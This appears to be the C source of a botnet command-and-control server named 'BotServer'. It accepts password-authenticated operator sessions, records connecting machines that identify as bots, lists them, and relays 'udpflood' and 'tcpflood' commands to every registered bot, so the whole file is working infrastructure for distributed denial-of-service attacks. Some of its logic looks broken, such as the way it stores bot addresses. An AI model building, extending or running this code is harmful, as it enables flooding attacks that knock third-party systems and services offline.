// BotServer

#include "std_hdr.h"
#include "net_hdr.h"
#include <sys/ioctl.h>
#include <sys/time.h>

#define bot_port 5077
#define def_port 7705

struct timeval timeout;

int sockfd, Tsockfd, newsockfd, newsockfd2;
struct sockaddr_in serv_addr, coming_addr1, coming_addr2;
char buffer[1024];
char arg1[20];
char *mybot[1200];
int lst = 0;
int i = 0;

void sendcmd();
void checkbot();
void checkcommand();
void settimeout();
extern void help();
socklen_t coming_len = sizeof(coming_addr1);
socklen_t coming2_len = sizeof(coming_addr2);

/* botserv.c [port] [password] */
int main(int argc, char* argv[])
{
	if (argc < 3)
		{
			printf("server [port] [password]\n");
			return 0;
		}
	char line[] = "\n[Command > ";
	int mstr = 0;
	Tsockfd = socket(AF_INET, SOCK_STREAM, 0);
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) 
        return 0;
	timeout.tv_sec = 5;
	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO,(char *)&timeout,sizeof(timeout));
     bzero((char *) &serv_addr, sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_addr.s_addr = INADDR_ANY;
	if (argv[1] != NULL)
     serv_addr.sin_port = htons(atoi(argv[1]));
	else
	serv_addr.sin_port = htons(7705); //default port
     if (bind(sockfd, (struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
              return 0;
     listen(sockfd,SOMAXCONN);
	checkcmg:
     newsockfd = accept(sockfd, (struct sockaddr *) &coming_addr1, &coming_len);
	int n;
	while (1)
	{
	bzero(buffer,1024);
	read(newsockfd,buffer,1024);
    	buffer[strlen(buffer)-2] = '\0';
		if (mstr == 0)
			{
				if (strcmp(buffer,argv[2]) == 0) 
					{
						mstr++;
						timeout.tv_sec = 0;
						setsockopt(newsockfd, SOL_SOCKET, SO_RCVTIMEO,(char *)&timeout,sizeof(timeout));
						goto starta;
					}

				if (strcmp(buffer,"bot") == 0) 
					{
						mybot[i] = (char*)inet_ntoa(coming_addr1.sin_addr.s_addr);
						i++;
						close(newsockfd);
						bzero((char *) &coming_addr1, sizeof(coming_addr1));
						goto checkcmg;
					}
				else
					{
						close(newsockfd);
						bzero((char *) &coming_addr1, sizeof(coming_addr1));
						goto checkcmg;
					}
			}
	startb:
	if (strcmp(buffer,"quit") == 0) 
		{
			close(newsockfd);
			mstr = 0;
			bzero(buffer,1024);
			bzero((char *) &coming_addr1,coming_len);
			goto checkcmg;
		}
	if (strcmp(buffer,"shutdown") == 0) 
		{
			close(newsockfd);
			close(sockfd);
			mstr = 0;
			bzero(buffer,1024);
			bzero((char *) &coming_addr1,coming_len);
			return 0;
		}
	checkcommand();
	starta:
	write(newsockfd,line,strlen(line));
	}
}

void checkcommand()
{
	sscanf(buffer,"%s",arg1);
	if (strcmp(arg1,"udpflood") == 0) 
		{
			sendcmd();
			write(newsockfd,"\n[*] udpflood to target ... \n",strlen("\n[*] udpflood to target ... \n"));			
			return;
		}
	else if (strcmp(arg1,"tcpflood") == 0)
		{
			sendcmd();
			write(newsockfd,"\n[*] tcpflood to target ... \n",strlen("\n[*] tcpflood to target ... \n"));
			return;
		}
	else if (strcmp(buffer,"checkbot") == 0)
		{
			checkbot();
			write(newsockfd,"[!]Current bot : \n",strlen("[!]Current bot : \n"));
			lst = 0;
			while(lst < i)
				{
					send(newsockfd,mybot[lst],strlen(mybot[lst]),0);
					write(newsockfd,"\n",strlen("\n"));
					lst++;
				}
			lst=0;
			return;
		}
	else if (strcmp(buffer,"help") == 0)
		{
			help();
			return;
		}
	else if (strcmp(arg1,"timeout") == 0)
		{
			bzero(arg1,20);
			sscanf(buffer,"%*s %s",arg1);
			settimeout();
			return;
		}
	else if (strcmp(arg1,"botlist") == 0)
		{
			write(newsockfd,"bot list : \n",strlen("bot list : \n"));
			lst = 0;
			while(lst < i)
				{
					send(newsockfd,mybot[lst],strlen(mybot[lst]),0);
					write(newsockfd,"\n",strlen("\n"));
					lst++;
				}
			lst=0;
			return;
		}
	else
		{
			write(newsockfd,"command not found\n",strlen("command not found\n"));
			return;
		}
}

void checkbot()
{
	newsockfd2 = accept(sockfd, (struct sockaddr *) &coming_addr2, &coming2_len);
	bzero(buffer,1024);
	read(newsockfd2,buffer,1024);
     buffer[strlen(buffer)-2] = '\0';
	if (strcmp(buffer,"bot") == 0) 
		{
			mybot[i] = (char*)inet_ntoa(coming_addr2.sin_addr.s_addr);
			i++;
		}
	close(newsockfd2);
	bzero((char *) &coming_addr2, sizeof(coming_addr2));
}

void sendcmd()
{
	while (lst < i)
	{
		bzero((char *) &coming_addr2, sizeof(coming_addr2));
		coming_addr2.sin_family = AF_INET;
     	coming_addr2.sin_addr.s_addr = inet_addr(mybot[lst]);
     	coming_addr2.sin_port = htons(bot_port);
		connect(Tsockfd,(struct sockaddr *) &coming_addr2,sizeof(coming_addr2));
		sendto(Tsockfd, buffer, strlen(buffer), 0, (struct sockaddr *) &coming_addr2, sizeof(coming_addr2));
		lst++;
	}
	lst=0;
}

void settimeout()
{
	timeout.tv_sec = atoi(arg1);
	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO,(char *)&timeout,sizeof(timeout));
}

